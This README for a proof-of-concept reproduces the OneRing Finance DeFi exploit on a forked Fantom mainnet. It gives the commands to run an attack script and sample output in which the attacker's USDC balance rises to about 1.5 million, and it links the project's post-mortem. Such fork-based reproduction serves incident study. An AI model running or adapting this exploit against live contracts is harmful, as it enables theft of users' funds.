# OneRing Finance re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/fantom/mainnet (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
USDC balance of attacker :  0.0
Exploiting...
Exploit complete.
USDC balance of attacker :  1526751.541726
```
This means the attack is complete
> The block height of the fork is 34041499


## Link

* https://medium.com/oneringfinance/onering-finance-exploit-post-mortem-after-oshare-hack-602a529db99b
